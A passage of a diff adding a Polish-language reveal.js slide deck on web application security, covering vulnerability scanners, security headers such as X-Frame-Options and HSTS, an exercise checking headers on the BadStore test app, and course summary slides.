+							<li>Burp Suite</li>
+							<li>OWASP ZAP</li>
+							<li>OpenVas</li>
+							<li>Skipfish</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Arachni</h3>
+						<img height="478" data-src="pictures/Arachni.png" alt="Arachni">
+					</section>
+					
+					<section>
+						<h3>OpenVas</h3>
+						<img height="498" data-src="pictures/openvas.png" alt="OpenVas">
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Nagłowki bezpieczeństwa</h2>
+					</section>
+					
+					<section>
+						<h3>Nagłowki bezpieczeństwa</h3>
+						Zaleca się dodanie standardowych nagłówków bezpieczeństwa:
+						<ul>
+							<li>X-Frame-Options,</li>
+							<li>Content Security Policy,</li>
+							<li>X-XSS-Protection,</li>
+							<li>HTTP Strict Transport Security (HSTS).</li>
+						</ul>
+						<a href="https://www.owasp.org/index.php/OWASP_Secure_Headers_Project">Projekt OWASP Secure Headers</a>
+					</section>
+					
+					<section>
+						<h3>X-Frame-Options</h3>
+						<ul>
+							<li>Nagłówek zabezpiecza przed atakami typu Clickjacking.</li>
+							<li>Najczęściej w miejscu wskazanym użytkownikowi do kliknięcia znajduje się niewidoczna ramka &lt;iframe&gt;, która przechwytuje kliknięcia, które wykonują pewną akcję w podatnej aplikacji.</li>
+							<li><a href="https://sekurak.pl/clickjacking-i-dwie-kropki-opis-bledu-w-facebooku/">Przyklad podatności - Sekurak.</a></li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>HTTP Strict Transport Security (HSTS)</h3>
+						<ul>
+							<li>HTTP Strict Transport Security (HSTS) jest mechanizmem bezpieczeństwa sieci, który chroni strony przed atakami takimi, jak wymuszona zmiana poziomu protokołu oraz przechwytywanie sesji.</li>
+							<li>Dzięki jego zastosowaniu przeglądarka łączy się tylko korzystając z połączeń HTTPS.</li>
+						</ul>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Ćwiczenie 6</h2>
+						<p style="text-align: left;">Weryfikacja obecności nagłowków bezpieczeństwa w aplikacji BadStore oraz wybranej innej np. Facebook.</p>					
+					</section>
+				</section>
+				
+				<section>
+				
+					<section>
+						<h2>Podsumowanie<h2>
+					</section>	
+
+					<section>
+					<h3>Podsumowanie (I)</h3>
+						<ul>
+							<li>Wprowadzenie i statystyki dotyczące podatności</li>
+							<li>Aplikacje testowe - BadStore i DVWA</li>
+							<li>Narzędzia typu lokalnego Proxy</li>
+							<li>Podatność XSS i jej wykorzystanie (BeEF i własny skrypt)</li>
+							<li>XSS metody ochrony i przykłady</li>
+						</ul>
+					</section>
+					
+					<section>
+					<h3>Podsumowanie (II)</h3>
+						<ul>
+							<li>Metasploit i zdalne przejęcie kontroli nad serwerem</li>
+							<li>Skanery umożliwiające automatyczne testy bezpieczeństwa</li>
+							<li>Nagłówki bezpieczeństwa</li>
+						</ul>
+					</section>
+				</section>
+				
+				<section style="text-align: left;" data-background="pictures/tlo_1.jpg" data-state="dimbg">
+					<h1>Dziękuję za uwagę</h1>
+				</section>
+			</div>
+
+		</div>
+
+		<script src="lib/js/head.min.js"></script>
+		<script src="js/reveal.js"></script>
+
+		<script>
+
+			// More info https://github.com/hakimel/reveal.js#configuration
+			Reveal.initialize({
+				controls: true,
+				progress: true,
+				history: true,
+				center: true,
+
+				transition: 'slide', // none/fade/slide/convex/concave/zoom
+
+				// More info https://github.com/hakimel/reveal.js#dependencies
+				dependencies: [
+					{ src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
+					{ src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+					{ src: 'plugin/search/search.js', async: true },
+					{ src: 'plugin/zoom-js/zoom.js', async: true },
+					{ src: 'plugin/menu/menu.js'},
+					{ src: 'plugin/notes/notes.js', async: true }
+				]
+			});
+
+		</script>
+
+	</body>
+</html>
